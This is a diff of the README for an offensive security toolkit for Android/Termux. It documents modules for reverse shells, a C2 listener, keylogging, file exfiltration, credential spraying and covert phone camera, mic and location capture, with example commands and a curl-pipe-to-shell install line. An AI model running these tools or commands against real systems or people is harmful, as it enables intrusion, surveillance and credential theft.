@@ -1,26 +1,26 @@
-# hkall
+# hkall — Modular Offensive Toolkit
 
-Modular offensive toolkit for Android/Termux (Python 3, stdlib). Use only on systems you own or have explicit permission to test.
-
-## v0.3.0 highlights
-- **sqlite result store** (`data/rs.db`) — scans/enum/lan/received auto-saved, view with `history`
-- **multi-session C2** — sessions/use/kill, opt-in stream obfuscation
-- **config profiles** (`config.json`) — host/port/cidr presets persist
-- **plugin loader** — drop a `.py` into `modules/` defining `PLUGIN = {"key": (name, fn, True)}`
-- **banner grab** on scan (optional)
+Python 3 stdlib toolkit for Android/Termux + Linux. Authorized security testing only.
 
 ## Install
 ```bash
 pkg install -y python git termux-api
 git clone https://github.com/rizqiwidi/hkall.git
-cd hkall && python hkall.py
+cd hkall && chmod +x hkall.py
+python hkall.py
 ```
+Or: `curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh`
 
 ## TUI
-Run `python hkall.py`, pick a number. 14 built-in modules:
+Run `python hkall.py`, pick a number. 18 built-in modules:
+
 ```
-scan enum whois shell c2 keylog exfil recv
-payload exe2 lan ops cfg history   (+ plugins in modules/)
+  [1] Port scanner          [2] Web enumerator       [3] DNS / banner lookup
+  [4] Subdomain brute DNS   [5] Reverse shell gen    [6] C2 listener (multi-session)
+  [7] Keylogger             [8] Exfil client         [9] Exfil server
+ [10] Android payload      [11] Shell payload var  [12] LAN host discoverer
+ [13] Device ops            [14] HTTP static server [15] Web form spray
+ [16] Config / profile      [17] History (results)  [18] Exit
 ```
 
 ## CLI one-shot
@@ -30,36 +30,73 @@ python hkall.py -m scan --host 192.168.1.5 --ports 1-1000
 python hkall.py -m scan --host x.x.x.x --ports 445,3389 --out scan.txt
 python hkall.py -m enum --host http://example.com
 python hkall.py -m payload --host 1.2.3.4 --port 8443
-python hkall.py -m history              # past results
-python hkall.py -m cfg                  # set presets (persist)
-python hkall.py -m c2 --port 4444       # multi-session listener
+python hkall.py -m history
+python hkall.py -m cfg
+python hkall.py -m c2 --port 4444
+python hkall.py -m subd --host example.com
+python hkall.py -m lan --cidr 192.168.1.0/24
+python hkall.py -m spray --host https://login.example.com
 ```
+
+## Module reference
+
+| key | name | what it does |
+|-----|------|-------------|
+| scan | Port scanner | TCP connect scan, optional banner grab |
+| enum | Web enumerator | headers, emails, secrets, form count |
+| whois | DNS lookup | A/AAAA records, reverse PTR |
+| subd | Subdomain brute | DNS wordlist scan, multi-threaded |
+| shell | Shell generator | py/bash/nc/sh/php one-liners |
+| c2 | C2 listener | multi-session, XOR stream obfuscation |
+| keylog | Keylogger | raw tty capture → `data/keys.log` |
+| exfil | Exfil client | send file to `recv` listener |
+| recv | Exfil server | receive file from `exfil` client |
+| payload | Payload builder | Python reconnect shell (plain or XOR) |
+| exe2 | Shell variants | Android termux / Linux one-liners |
+| lan | LAN discoverer | probe CIDR, detects 22/80/135/139/443/445/3389 |
+| ops | Device ops | battery, sms, camera, mic, location, vibrate, clipboard |
+| serve | HTTP server | static file server on port 8080 |
+| spray | Credential spray | wordlist brute-force web login forms |
+| cfg | Config profile | set host/port/cidr defaults (persisted) |
+| history | History | view sqlite result store `data/rs.db` |
 
 ## C2 usage
-Start listener `-m c2 --port 4444`. Session commands:
+```bash
+python hkall.py -m c2 --port 4444
 ```
-sessions          # list connected shells
-use S1            # select session 1
-kill S1           # drop session
-<cmd>             # run on selected session
-exit              # stop listener
+Session commands inside listener:
 ```
-Stream obfuscation: set `obfuscate:true` in config.json, then `-m payload` with obfuscate=y so client matches.
+sessions          list connected shells
+use S1            select session 1
+kill S1           drop session
+<cmd>             run on selected session
+exit              stop listener
+```
+**Obfuscation**: set `obfuscate: true` in `config.json`, then build payload with `y`. Client and server XOR stream match.
 
-## Plugins
-Create `modules/mymod.py`:
+## Plugin system
+Drop `.py` into `modules/`:
 ```python
 def mod_mymod():
-    print("hi")
+    print("hello from plugin")
 PLUGIN = {"mymod": ("My module", mod_mymod, True)}
 ```
-Loaded at startup, appears in TUI + CLI.
+Plugins auto-loaded, appear in TUI and CLI. Sample: `modules/hello.py`.
 
 ## Data / artifacts
-- `data/rs.db` — sqlite history (kind,target,ts,data)
-- `data/keys.log` — keylogger
+- `data/rs.db` — sqlite history (kind, target, ts, data)
+- `data/keys.log` — keylogger capture
 - `data/payload.py` — built payload
-- `data/cam_*.jpg`, `data/mic_*.m4a` — ops captures
+- `data/cam_*.jpg` — camera capture
+- `data/mic_*.m4a` — mic recording
+- `wordlist.txt` — password wordlist for spray
+- `subd.txt` — subdomain wordlist
+
+## Config
+Defaults stored in `config.json`. Edit manually or use `cfg` module:
+```json
+{"host": "1.2.3.4", "port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24"}
+```
 
 ## Legal
-Authorized testing only. You are responsible for how this is used.
+Authorized testing only. You own the consequences.
